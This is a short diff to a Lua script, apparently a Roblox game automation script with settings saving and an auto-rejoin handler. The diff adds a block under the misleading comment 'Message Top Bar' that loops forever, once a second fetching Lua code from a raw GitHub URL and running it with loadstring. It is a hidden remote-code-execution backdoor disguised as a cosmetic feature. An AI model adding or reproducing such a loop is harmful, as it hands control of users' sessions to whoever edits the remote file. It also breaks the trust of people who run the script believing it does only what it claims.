@@ -69,6 +69,12 @@ function SaveSettings()
         writefile(file_settings, json)
     end
 end
+--Message Top Bar
+coroutine.resume(coroutine.create(function()
+while true do wait(1)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/HelloHiPro/HelloHiPro/main/New_Text_Document2.lua'))()
+end
+end))
 --Rejoin if dc
 coroutine.resume(coroutine.create(function()
 game:WaitForChild('CoreGui'):WaitForChild('RobloxPromptGui'):WaitForChild('promptOverlay').DescendantAdded:Connect(function()
